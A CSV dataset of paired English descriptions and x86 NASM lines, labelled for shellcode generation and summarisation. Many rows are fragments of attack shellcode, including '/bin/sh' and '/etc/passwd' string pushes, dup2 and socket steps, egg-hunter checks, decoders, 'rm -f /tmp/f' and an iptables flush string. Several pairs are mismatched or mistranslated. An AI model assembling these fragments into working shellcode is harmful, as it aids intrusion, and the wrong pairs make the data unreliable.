input_text,target_text
ShellCodeGen: add 48 to edx,"add edx, 48"
ShellCodeGen: decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero,loop main_push
ShellCodeGen: move the address of msg1 into eax,"mov eax, msg1"
"ShellCodeSum: cmp eax, ebx",compare eax with ebx
ShellCodeGen: save the effective address of my_table in ebx,"mov ebx, [my_table]"
ShellCodeGen: compare if edx is zero,"cmp edx, 0"
ShellCodeGen: make the syscall to terminate the program,int 80h
ShellCodeGen: push the value 15 onto the stack and point ecx to the stack register,"push 15 \n mov ecx, esp"
ShellCodeSum: var_a db 232,allocate one byte of memory for var_a variable and initialize it to 232
"ShellCodeSum: test eax, eax \n jnz short _parent",jump short to the label _parent if the contents of the eax register is not zero
ShellCodeGen: subtract the contents of esi from the 32-bit integer stored at memory location var2,"sub [var2], esi"
ShellCodeSum: len: equ $-google,declare the len label equal to the size of the google variable
ShellCodeGen: declare the incaddr label,incaddr:
ShellCodeSum: _parent:,define the _parent label
ShellCodeGen: zero out the eax and ebx register,"xor ebx, ebx \n mul ebx"
ShellCodeGen: decrement the contents of the ecx register and jump to the dup2 label if the result is not negative,dec ecx \n jns dup2
ShellCodeGen: perform xor operation between the value stored at the location ecx+116 and bh,"xor [ecx + 116], bh"
ShellCodeSum: push byte 6,push the byte 6 to the stack
ShellCodeGen: move eax into sock_reg,"mov sock_reg, eax"
ShellCodeGen: add 10 to eax,"add eax, 10"
ShellCodeSum: push byte 0x0,push the byte 0x0 onto the stack
"ShellCodeSum: sub byte [esi], 13",subtract 13 from the byte in esi and save the result in esi
ShellCodeSum: len: equ $-shellcode,declare the len label equal to the length of shellcode
"ShellCodeSum: cmp eax, ebx \n jne retry",if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
ShellCodeGen: define stage label,stage:
ShellCodeSum: push 0x6c626174,push 0x6c626174 onto the stack
ShellCodeGen: move the value 672274793 into the ecx register,"mov ecx, 672274793"
ShellCodeGen: add the contents of the local variable stored at ebp-4 into eax,"add eax, [ebp-4]"
"ShellCodeSum: push word 0x632d \n mov edi, esp",push the word 0x632d onto the stack and point the edi register to the stack register
"ShellCodeSum: xor ecx, ecx",initialize ecx to zero
"ShellCodeSum: push edi \n mov ecx, esp",push the contents of the edi register onto the stack and point ecx to the stack register
ShellCodeGen: compare the byte pointed to by eax at this address against zero,"cmp byte [eax], 0"
ShellCodeGen: push the 0x1 onto the stack,push 0x1
"ShellCodeSum: cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
"ShellCodeSum: mov al, 0x6",move 0x6 into al
ShellCodeGen: move hexstr into ecx,"mov ecx, hexstr"
ShellCodeGen: jump short to _load_data label,jmp short _load_data
"ShellCodeSum: test eax, eax \n jnz do_next_accept",if the contents of the eax register is not zero then jump to the label do_next_accept
ShellCodeSum: push 0x74303072,push 0x74303072 onto the stack
ShellCodeSum: push word 0x6f64,push the word 0x6f64 onto the stack
ShellCodeSum: push edi,push the contents of the edi register onto the stack
ShellCodeSum: push dword 0x2f3a2f3a,push the double word 0x2f3a2f3a onto the stack
ShellCodeGen: add 3 to the contents of the ebx register,"add ebx, 3"
"ShellCodeSum: xor ax, ax",zero out ax register
ShellCodeGen: move 8 decimal into edx,"mov edx, 8"
ShellCodeSum: push byte 0x4,push the byte 0x4 onto the stack
"ShellCodeSum: and eax, 3f465456",perform and operation between eax and 3f465456 and save the result in eax
ShellCodeGen: decrement the contents of the cl register and jump to the dup2 label if the result is not negative,dec cl \n jns dup2
ShellCodeSum: variablename1: resb 1,reserve 1 byte for variableName1
ShellCodeSum: jmp two,jump to two
ShellCodeGen: push the 0x66 onto the stack,push 0x66
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov esi, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register
ShellCodeGen: push the dword 0x74652f2f onto the stack,push dword 0x74652f2f
ShellCodeGen: put the syscall 0x30 into the eax register,push byte 0x30 \n pop eax
"ShellCodeSum: push 0x6e69622f \n push 0x7273752f \n mov eax, esp",push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
ShellCodeGen: decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero,loopnz decode
ShellCodeSum: je exit,jump to the exit label if the operands of the above comparison are equals
ShellCodeSum: push 0x68732f2f,push ascii sh// onto stack
"ShellCodeSum: mov eax, 65",make the system call to get the process group
"ShellCodeSum: xchg ecx, edx",exchange ecx with edx
ShellCodeSum: var2 db ?,declare an uninitialized byte labeled var2
ShellCodeGen: subtract the byte value 0x1 from esp register and save the result in esp,"sub esp, byte 0x1"
ShellCodeGen: move the contents of zero_reg into the memory location specified by the operation [ebp+20],"mov [ebp+20], zero_reg"
"ShellCodeSum: mov cx, 2001Q",move 2001Q into cx
ShellCodeGen: subtract the contents of the edx register from the contents of the edx register,"sub edx, edx"
ShellCodeSum: push 0x74,push 0x74 to the stack
ShellCodeGen: move the byte starting at the address [esi + eax + 1] into the bl register,"mov bl, byte [esi + eax + 1]"
ShellCodeGen: if the contents of the eax register is not zero then jump to the label do_next_accept,"test eax, eax \n jnz do_next_accept"
"ShellCodeSum: mov dl, 0xff",move 0xff into dl
ShellCodeGen: push 0x2f2f2f2f onto the stack,push 0x2f2f2f2f
ShellCodeGen: push the value 0x64687373 onto the stack and point the ebx register to the stack register,"push 0x64687373 \n mov ebx, esp"
"ShellCodeSum: shr bl, 4",right shift the contents of bl register by 4 bit positions
ShellCodeGen: declare message string msg2 containing 'this is how we recycle in nasm',"msg2 db 'this is how we recycle in nasm.', 0ah"
ShellCodeSum: _socket:,define the _socket label
ShellCodeGen: _start function,_start:
ShellCodeGen: jump short to the _cmd label,jmp short _cmd
ShellCodeGen: declare the main label,main:
ShellCodeGen: jump to nextarg label,jmp nextarg
"ShellCodeSum: mov ecx, esp",point ecx to the top of the stack
ShellCodeSum: db 'rm -f /tmp/f',define the byte string 'rm -f /tmp/f'
ShellCodeGen: if the remainder is not equal to zero jump to local label checkbuzz,jne checkbuzz
ShellCodeGen: declare an unlabeled byte initialized to 0x80,db 0x80
"ShellCodeSum: xor dl, 0xbb",perform a logical xor between the dl register and 0xbb and save the result in dl
"ShellCodeSum: lea esi, [esi+4]",load the effective address [esi+4] into esi
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov esi, esp"
ShellCodeGen: push the byte 0x8 onto the stack and point edx to the stack register,"push byte 0x8 \n mov edx, esp"
ShellCodeGen: decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register,"loopnz L3 \n mov edx, 7"
ShellCodeGen: move 0x68732f2f into the dword at the memory location [esp-8],"mov dword [esp-8], 0x68732f2f"
ShellCodeGen: push the dword 0x69622f2f onto the stack,push dword 0x69622f2f
ShellCodeGen: decrement ecx,dec ecx
"ShellCodeSum: test eax, eax \n jnz short _parent",if the contents of the eax register is not zero then jump short to the label _parent
ShellCodeSum: push dword 0x017aa8c0,push the dword 0x017aa8c0 onto the stack
ShellCodeGen: push the doubleword 0x00000000 onto the stack,push dword 0x00000000
"ShellCodeSum: cmp al, 0xf2 \n je _start \n mov eax, 0x50905090",jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
ShellCodeGen: jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \ jnz _end \n jmp edi
ShellCodeGen: get 36 in the ecx,"mov ecx, 36"
ShellCodeGen: push the byte 0x05 onto the stack,push byte 0x05
ShellCodeGen: zero out bl register,"xor bl, 0xbb"
ShellCodeGen: push the word 0x6666 onto the stack,push word 0x6666
ShellCodeGen: push 0x0a3a7964 onto the stack,push 0x0a3a7964
ShellCodeSum: push byte 54,push the byte 54 onto the stack
"ShellCodeSum: mov bl, 0bh",move 0bh into bl
ShellCodeGen: define me label,me:
"ShellCodeSum: xor edi, edi",initialize edi with 0
"ShellCodeSum: mov eax, 4",specify sys_write call
ShellCodeSum: push byte 0x66,push the byte 0x66 onto the stack
ShellCodeSum: jns loopinghere,jump to the loopinghere label if the previous instruction clears the sign flag
ShellCodeGen: call my_subroutine,call my_subroutine
"ShellCodeSum: sub eax, 0x2c3d2dff",subtract 0x2c3d2dff from the contents in eax and save the result in eax
ShellCodeGen: move 0x80 into ah,"mov ah, 0x80"
ShellCodeGen: define the doubleword arr and initialize it to 50,arr dd 50
"ShellCodeSum: test edx, edx",test the contents of the edx register
ShellCodeGen: push the ax onto the stack,push ax
ShellCodeGen: define the _write label,_write:
ShellCodeGen: push esi on the stack,push esi
"ShellCodeSum: mov edi, 0x978cd092",move 0x978cd092 into edi
ShellCodeGen: push the 0x2f656c2d onto the stack,push 0x2f656c2d
ShellCodeSum: do_dup:,define do_dup label
ShellCodeGen: define decoder label,decoder:
ShellCodeSum: loop decode \n jmp edx,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
ShellCodeGen: push the byte 17h onto the stack,push byte 17h
ShellCodeSum: jmp short cmd,jump short to the cmd label
ShellCodeGen: load the effective address of the result of the operation [esi+22] into the ecx register,"lea ecx, [esi+22]"
ShellCodeGen: divide edx by 2 using right shift,"shr edx, 1"
ShellCodeGen: compare ebx register's lower half value against ascii value 48,"cmp bl, 48"
"ShellCodeSum: mov ax, 0x16b",move 0x16b into ax
ShellCodeGen: push the contents of the eax register onto the stack and point ecx to the stack register,"push eax \n mov ecx, esp"
ShellCodeSum: word_value dw 300,define the word value word_value and initialize it to 300
ShellCodeGen: jump short to the label _parent if the contents of the eax register is not zero,"test eax, eax \n jnz short _parent"
ShellCodeGen: move the contents of the esi register into the al register,"mov al, [esi]"
ShellCodeGen: move the contents at memory specified by z to eax,"mov eax, [z]"
ShellCodeGen: restore the top of the stack into the esp register,pop esp
ShellCodeGen: jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e,"cmp BYTE [edx], 0x2e \n jne l2"
ShellCodeGen: move /bin/sh into the ebx register,"push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: move 0xff into dh,"mov dh, 0xff"
ShellCodeGen: push 0x10 onto the stack,push 0x10
"ShellCodeSum: mov ebx, esp",move the contents of the esp register into the ebx register
ShellCodeGen: push the word [edx] to the stack,push word [edx]
ShellCodeSum: push 0x61702f2f,push 0x61702f2f onto the stack
ShellCodeSum: scasd \n jnz _end \n jmp edi,jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
ShellCodeGen: move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx,"mov dword [ebx], 2"
ShellCodeGen: push 0x6d726574 to the stack,push 0x6d726574
ShellCodeSum: callpop:,define the callpop label
ShellCodeSum: call _build,call the _build function
"ShellCodeSum: mov al, 72h",move 72h into al
"ShellCodeSum: sub ax, 1564",subtract 1564 from the contents of the ax register
ShellCodeGen: move the value of register at address esp+4 and store into eax,"mov eax, [esp+4]"
ShellCodeSum: push 0x2e373231,push 0x2e373231 onto the stack
ShellCodeSum: dec ebx,subtract one from the contents of ebx
ShellCodeSum: jnz loop,jump to loop if not equal to zero
"ShellCodeGen: define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b","db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b"
ShellCodeGen: jump to the formatting label if the zero flag is set,jz formatting
ShellCodeSum: main_inc:,declare the main_inc label
ShellCodeGen: move 0x1 into ebx,"mov ebx, 0x1"
"ShellCodeSum: mov al, byte [edi]",move the byte in edi into the al register
ShellCodeGen: subtract 1634 from the contents of the bx register,"sub bx, 1634"
"ShellCodeSum: mov bl, dl",move dl into bl
ShellCodeSum: push esp,push the contents of esp register onto the stack
ShellCodeGen: move the contents of the eax into the double word starting at the address [esp-0x4],"mov dword [esp-0x4], eax"
ShellCodeSum: push word 0x6465,push the word 0x6465 onto the stack
ShellCodeGen: if the contents of the cl register is not equal to the value 0x3 then jump to the loop label,"cmp cl, 0x3 \n jne loop"
ShellCodeGen: jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register,"cmp dword [eax], ebx \n jne next_addr \n jmp eax"
"ShellCodeSum: sub bl, 0x7",subtract 0x7 from the contents in bl and save the result in bl
"ShellCodeSum: cmp ax, bx \n jne l3 \n jmp while",if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
"ShellCodeSum: xor ax, 0x3041",perform the xor operation between the ax register and the value 0x3041
ShellCodeGen: push the 0x7374736f onto the stack,push 0x7374736f
ShellCodeSum: push ebp,save old base pointer
ShellCodeGen: move the contents of the esp register into the edx register,"mov edx, [esp]"
"ShellCodeSum: loop l1 \n mov eax, esp",decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
"ShellCodeSum: mov ax, 8h",move 8h into ax
ShellCodeGen: define the _parent_read label,_parent_read:
"ShellCodeSum: xor eax, 0x7575",perform a logical xor operation between eax and 0x7575
ShellCodeSum: push word bx,push the word bx to the stack
ShellCodeSum: loop decode \n jmp Shellcode,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label
"ShellCodeSum: mov ebx, 0",use stdin
ShellCodeSum: loop main_loop,decrement the counter and jump to the main_loop label if the count is not zero
ShellCodeGen: make the system call to terminate the process,"mov eax, 1"
"ShellCodeSum: xor edx, edx \n cmp ecx, edx \n jne l2",zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register
ShellCodeSum: mul ecx,multiply eax by ecx
"ShellCodeSum: mov bl, 0x1",move the value 0x1 into the bl register
ShellCodeGen: push 0x68736164 onto the stack,push 0x68736164
"ShellCodeSum: lea ebx, [esi+15]",load the effective address [esi+15] into ebx
ShellCodeGen: decrement the ebx register by one,dec ebx
ShellCodeGen: jump to the loop label if the zero flag is cleared,jnz loop
ShellCodeSum: push dword [edx+2],push the dword [edx+2] onto the stack
ShellCodeSum: neg eax,replaces the contents of the eax register with its two's complement
ShellCodeGen: add 0x2d383638 to the contents in eax and save the result in eax,"add eax, 0x2d383638"
ShellCodeGen: install signal handel,"mov eax, 48"
ShellCodeGen: compare the dword at the address [eax-4] and egg1,"cmp dword [eax-4], egg1"
ShellCodeSum: l00p:,declare the l00p label
ShellCodeGen: declare the write label,write:
"ShellCodeSum: cmp byte [eax], 0",compare the byte pointed to by eax at this address against zero
ShellCodeSum: _isegg:,define the _isegg label
ShellCodeGen: move ecx into the doubleword starting at the address esp-4,"mov dword [esp-4], ecx"
"ShellCodeSum: mov al, 1",move the value 1 into the al register
ShellCodeGen: jump to loop if not equal to zero,jnz loop
"ShellCodeSum: push dword 0x74652f2f \n mov ecx, esp",push double word 0x74652f2f onto the stack and point the ecx register to the stack register
ShellCodeGen: decrease eax by 3,"sub eax, 3"
ShellCodeGen: clear the ebx register,"xor ebx, ebx"
ShellCodeGen: move ecx into edi,"mov edi, ecx"
ShellCodeGen: push 0x7665642f onto the stack,push 0x7665642f
"ShellCodeSum: mov byte [edx + eax], bl",move bl into the byte at address [edx + eax]
ShellCodeGen: move the byte at the address [esi] into bl,"mov bl, byte [esi]"
ShellCodeGen: move the effective address of digits+eax into al,"mov al, byte [digits+eax]"
ShellCodeGen: sigaction,"mov eax, 67"
ShellCodeSum: inc cl,increment the contents of the cl register
ShellCodeSum: push 0x782f2f32,push 0x782f2f32 onto the stack
ShellCodeSum: push dword 0x6f702f6e,push the dword 0x6f702f6e onto the stack
ShellCodeSum: pop esi,restore the top of the stack into the esi register
ShellCodeSum: dec cl,decrement the contents of cl
"ShellCodeSum: mov ecx, contents",move the memory address of contents variable into ecx
ShellCodeGen: push the byte 0x01 onto the stack,push byte 0x01
ShellCodeGen: move pointer in eax into esi,"mov esi, eax"
ShellCodeGen: push the contents of edx register onto the stack,push edx
"ShellCodeSum: mov eax, 1",make the system call to terminate the process
ShellCodeGen: declare the bss section,section .bss
"ShellCodeSum: push esi \n mov edx, esp",push the contents of the esi register onto the stack and point edx to the stack register
ShellCodeSum: jne loop,jump to the address specified by the label loop if the operands are not equals in the previous comparison
ShellCodeGen: jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi,scasd \n jnz _end
ShellCodeSum: push dword 0x69622f2f,push the dword 0x69622f2f onto the stack
ShellCodeGen: move 54 into al,"mov al, 54"
ShellCodeSum: push ebx,push the ebx value to the stack
ShellCodeSum: jmp short call_decoder,jump short to call_decoder
"ShellCodeSum: cmp ecx, edx \n ja l1",jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
"ShellCodeSum: word_table dw 134, 345, 564, 123",declare the array of words word_table initialized to 134 345 564 and 123
ShellCodeSum: db '/etc/passwd#',define the byte string '/etc/passwd#'
ShellCodeGen: push the 0x697a onto the stack,pushw 0x697a
ShellCodeGen: reset both lower and uppper bytes of eax to be 0,"xor eax, eax"
ShellCodeGen: push 0x6567772f onto the stack,push 0x6567772f
ShellCodeSum: inc byte [esp+ecx],increment the byte at the address [esp+ecx] by one
ShellCodeGen: move the value 0x72702f2f into the double word starting at the address [esp-0x28],"mov dword [esp-0x28], 0x72702f2f"
ShellCodeGen: move 5 into ebx,"mov ebx, 5"
ShellCodeGen: add 24 to eax,"add eax, 24"
ShellCodeSum: jne no_error,jump to the label no_error if not equal
ShellCodeSum: pop eax,restore eax from the value we pushed onto the stack at the start
ShellCodeGen: pop the value on the stack back into esi,pop esi
ShellCodeSum: push 0x61622f6e,push 0x61622f6e onto the stack
ShellCodeGen: system call signal,"mov eax, 48"
ShellCodeSum: jz encoded,if zero jump to the encoded label
ShellCodeGen: move 0x0a into the byte at address [esp],"mov byte [esp], 0x0a"
ShellCodeSum: push byte +0x6,push the byte +0x6 onto the stack
ShellCodeGen: move 0x09 into dl,"mov dl, 0x09"
ShellCodeSum: db '/sbin/iptables#-f#',define the byte string '/sbin/iptables#-f#'
"ShellCodeSum: mov cl, 077o",move 077o into cl
ShellCodeSum: push 0x76766c2d,push 0x76766c2d onto the stack
ShellCodeGen: move the byte at the address [esi + 1] into dl,"mov dl, byte [esi + 1]"
ShellCodeGen: call kernel,int 0x80
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov eax, esp"
ShellCodeGen: move the contents of the ax register at the memory location specified by the operation [bp+0x3e],"mov [bp+0x3e], ax"
ShellCodeGen: compare the contents of eax and the contents of ebx,"cmp eax, ebx"
"ShellCodeSum: lea esp, [ebx]",load the value of register ebx into register esp
"ShellCodeSum: mov bl, 0x4",move the value 0x4 onto the stack
"ShellCodeSum: cmp al, 0xf2 \n je _start",jump to the _start label if the contents of the al register is equal to the value 0xf2
"ShellCodeSum: cmp eax, ebx \n je exit",if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
ShellCodeGen: subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero,"sub bl, 3 \n jnz stage"
ShellCodeGen: push len onto the stack,push len
"ShellCodeSum: mov cl, 0x1e",move 0x1e into cl
ShellCodeGen: terminate the process,"mov eax, 1"
"ShellCodeSum: mov dl, 0xd",move 0xd into dl
ShellCodeGen: push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register,"push 0x6e69622f \n push 0x7273752f \n mov edx, esp"
ShellCodeGen: restore the top of the stack into the ebp register,pop ebp
ShellCodeSum: push 0x68732f2f,push 0x68732f2f to the stack
"ShellCodeSum: lea bx, [bp+0x0b]",load the effective address of the operation bp+0x0b] into the bx register
ShellCodeGen: system call sigaction,"mov eax, 67"
ShellCodeGen: load the effective address of ebx into the edi register,"lea edi, [ebx]"
ShellCodeGen: move 4 into al,"mov al, 4"
ShellCodeSum: loopnz decode,decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
"ShellCodeSum: xor ecx, ecx",reset ecx to 0
"ShellCodeSum: xchg ebx, eax",exchange the contents of the ebx register with the contents of the eax register
ShellCodeGen: push the contents of the esi register onto the stack and point ecx to the stack register,"push esi \n mov ecx, esp"
ShellCodeSum: jmp multiplyloop,jump to label multiplyloop
ShellCodeSum: push edx,push the contents of the edx register onto the stack
ShellCodeGen: restore the top of the stack into the edx register,pop edx
ShellCodeGen: subtract 0xd from the byte at the address esi,"sub byte [esi], 0xd"
ShellCodeGen: jump to the _start label if the contents of the al register is equal to the value 0xf2,"cmp al, 0xf2 \n je _start"
ShellCodeSum: inc_dec:,declare inc_dec function
ShellCodeGen: perform a logical xor between the address speicified by [ecx + 116] and the bh register and save the result in [ecx + 116],"xor [ecx + 116], bh"
ShellCodeGen: define the byte string 'egg mark',db 'egg mark'
ShellCodeGen: move eax into edx,"mov edx, eax"
ShellCodeGen: define the byte value bytes and initialize it to 10,bytes db 10
"ShellCodeSum: mov al, 0x2e",move 0x2e into al
ShellCodeGen: if 0 then jump to loc_402b13,jz short loc_402b13
ShellCodeGen: declare text section,section .text
ShellCodeSum: push 0x706d742f,push 0x706d742f to the stack
ShellCodeGen: system call getpid,"mov eax, 20"
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov ecx, esp"
"ShellCodeSum: mov eax, childmsg",move childmsg into eax
ShellCodeGen: push 0x67513231 onto the stack,push 0x67513231
"ShellCodeSum: add esi, 0x30",add 0x30 to esi
"ShellCodeSum: shl eax,2",left shift eax by two bits
ShellCodeGen: push the 0x6962732f onto the stack,push 0x6962732f
ShellCodeGen: declare the priv_setgid label,priv_setgid:
"ShellCodeSum: mov edi, 0x343997b7",move 0x343997b7 into edi
ShellCodeSum: inc dword [var],add one to the doubleword integer stored at location var
ShellCodeSum: msg_len equ $-msg,define msg_len equal to the length of msg
ShellCodeGen: load the effective address [esi+26] into edx,"lea edx, [esi+26]"
ShellCodeGen: move the memory address of contents string into ecx,"mov ecx, contents"
ShellCodeGen: push the byte chmod_call onto the stack,push byte chmod_call
ShellCodeGen: add ebx to eax and store the result in eax,"add eax, ebx"
ShellCodeGen: push 0x32322e32 to the stack,push 0x32322e32
ShellCodeGen: declare the decoder label,decoder:
ShellCodeGen: push the byte 0x77 onto the stack,push byte 0x77
ShellCodeGen: increment ebx register,inc ebx
ShellCodeGen: push the double word 0x303a3a31 onto the stack,push dword 0x303a3a31
ShellCodeGen: move 0x4 into bl,"mov bl, 0x4"
ShellCodeSum: call writestring,call the writestring function
"ShellCodeSum: push 0x6e7a762d \n mov ebp, esp",push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
ShellCodeGen: push the dword 0x776f6461 onto the stack,push dword 0x776f6461
ShellCodeSum: push byte 15,push the byte 15 onto the stack
ShellCodeGen: subtract 1564 from the contents of ax register and save the result in ax,"sub ax, 1564"
ShellCodeGen: perform the xor operation between the ax register and the value 0x4f73,"xor ax, 0x4f73"
ShellCodeSum: push byte 0x4 \n pop eax,put the syscall 0x4 into the eax register
"ShellCodeSum: add eax, 0x10",add 0x10 to eax
"ShellCodeSum: mov bl, 0x3",move 0x3 into bl
ShellCodeGen: jump to label read,jmp read
ShellCodeGen: add the contents of the eax register to the edx register,"add edx, eax"
"ShellCodeSum: mov edx, readbuffer",move readbuffer into edx
"ShellCodeSum: cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD",if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
"ShellCodeSum: ror esi, 1",right rotate the contents of the esi register by 1 bit
ShellCodeSum: push word 0x462d,push the word 0x462d to the stack
ShellCodeSum: jz formatting,jump to the formatting label if the zero flag is set
ShellCodeGen: push the byte 0x77 to the stack,push byte 0x77
ShellCodeGen: jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register,"cmp eax, edi \n jne infinite \n xor eax, eax"
ShellCodeSum: push 0x6e,push the 0x6e onto the stack
"ShellCodeSum: cmp [ebp+var_a], 0",compare if the contents at memory location ebp+var_a is 0
ShellCodeSum: my_table times 10 dw 0,allocate my_table vector of 10 words each initialized to 0
ShellCodeGen: move rm to ecx,"mov ecx, rm"
ShellCodeGen: move the value 0x65636170 into the double word starting at the address [esp-0x8],"mov dword [esp-0x8], 0x65636170"
ShellCodeGen: left shift the contents of the esi register by 0x1 bit,"shl esi, 0x1"
ShellCodeGen: push 0xf onto the stack,push 0xf
"ShellCodeSum: mov esi, edx",move remainder into esi
ShellCodeSum: jnz exeunt,jump to exeunt if not zero
"ShellCodeSum: test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6",jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register
ShellCodeGen: move the value 1 into the al register,"mov al, 1"
ShellCodeGen: jump to the label l1 if the contents of the al register is greater than the decimal value 9,"cmp al, 9 \n jg l1"
"ShellCodeSum: mov eax, 1",invoke sys_exit
ShellCodeGen: push 0x30317974 onto the stack,push 0x30317974
"ShellCodeSum: mov al, 0xa2",move 0xa2 into al
ShellCodeGen: push the word 10 to the stack,push word 10
ShellCodeGen: move address of request variable into ecx,"mov ecx, request"
ShellCodeSum: neg ecx,replaces the contents of the ecx register with its two's complement
ShellCodeGen: if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon,"test ax, ax \n jnz exeunt \n jmp carryon"
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov edi, esp"
"ShellCodeSum: mov cl, byte [eax]",move the byte at the address [eax] into cl
"ShellCodeSum: push ebx \n mov ecx, esp",push the contents of the ebx register onto the stack and point ecx to the stack register
"ShellCodeSum: push word 0x632d \n mov edx, esp",push the word 0x632d onto the stack and point the edx register to the stack register
"ShellCodeSum: mov ecx, 672274793",move the value 672274793 into the ecx register
ShellCodeGen: define the _random label,_random:
ShellCodeSum: stage:,define stage label
ShellCodeGen: place the quantity ebx+4*esi in edi,"lea edi, [ebx+4*esi]"
ShellCodeGen: jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register,"cmp dword [eax-4], egg2 \n je _next \n jmp eax"
ShellCodeGen: decrement the dl register by one,dec dl
ShellCodeSum: jns dup2,jump to the dup2 label if the previous instruction clears the sign flag
ShellCodeSum: jmp _read,jump to _read
"ShellCodeSum: xor zero_reg, zero_reg",zero out zero_reg
ShellCodeSum: call my_subroutine,call my_subroutine
ShellCodeGen: jump to the label socket if the contents of the eax register is zero,"test eax, eax \n jz socket"
"ShellCodeSum: mov al, 0x0b",move 0x0b into al
ShellCodeGen: perform logical and between ax and 1,"and ax, 1"
"ShellCodeSum: push word 2 \n mov ecx, esp",push the word 2 onto the stack and point ecx to the stack register
ShellCodeGen: move 0x3f into al,"mov al, 0x3f"
ShellCodeGen: restore eax from the value we pushed onto the stack at the start,pop eax
"ShellCodeSum: mov bl, [esi+ecx]",move the contents of memory address esi+ecx into bl
"ShellCodeSum: loop l3 \n mov ecx, esp",decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
ShellCodeGen: move 0x8b90909d into eax,"mov eax, 0x8b90909d"
"ShellCodeSum: mov byte [esi+14],al",move the contents of al into the byte at the memory location specified by the operation [esi+14]
ShellCodeGen: jump to exeunt if not zero,jnz exeunt
ShellCodeGen: subtract the contents of ecx from the contents of ecx,"sub ecx, ecx"
ShellCodeGen: jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register,"cmp eax, ebx \n jne retry"
"ShellCodeSum: mov eax, esi",move esi into eax
"ShellCodeSum: push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx, esp",push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register
ShellCodeGen: move bl into the byte at address [edx + eax],"mov byte [edx + eax], bl"
ShellCodeGen: push the word 0x776f onto the stack,push word 0x776f
ShellCodeGen: replaces the contents of the ebx register with its two's complement,neg ebx
ShellCodeSum: jmp short rotate,jump short to the rotate label
ShellCodeGen: push the byte 0x0 onto the stack,push byte 0x0
ShellCodeGen: push 0x74303072 onto the stack,push 0x74303072
"ShellCodeSum: shr ax, cl",right shift the contents of the edi register by the contents of the cl register
"ShellCodeSum: mov eax, 2",make the system call fork
ShellCodeGen: move the byte 2ah into al,"mov al, byte 2ah"
"ShellCodeSum: mov dword [esp-0x8], 0x65636170",move the value 0x65636170 into the double word starting at the address [esp-0x8]
ShellCodeGen: if the contents of the eax register is zero then jump to the label check_html else jump to the while label,"test eax, eax \n jz check_html \n jmp while"
ShellCodeSum: push 0x5,push the 0x5 onto the stack
ShellCodeGen: initialize bx to 0,"xor bx, bx"
ShellCodeGen: load the effective address of the result of the operation [esi + 13] into the edi register,"lea edi, [esi + 13]"
"ShellCodeSum: sub esp, 4",allocate memory for local variables
ShellCodeGen: push the 20 onto the stack,push 20
ShellCodeGen: load the effective address of the result of the operation [esi + 8] into the ecx register,"lea ecx, [esi + 8]"
ShellCodeSum: push 0x682f2f2f,push 0x682f2f2f onto the stack
ShellCodeGen: push the dword [edx+2] onto the stack,push dword [edx+2]
ShellCodeGen: push the dword 0x6d6f646e onto the stack,push dword 0x6d6f646e
"ShellCodeSum: test eax, eax \n js _while_loop",if the contents of the eax register is negative then jump to the label _while_loop
ShellCodeGen: push the byte 0x3f onto the stack,push byte 0x3f
ShellCodeSum: int 80h,make the system calls to the kernel
ShellCodeGen: move 43 decimal into edx,"mov edx, 43"
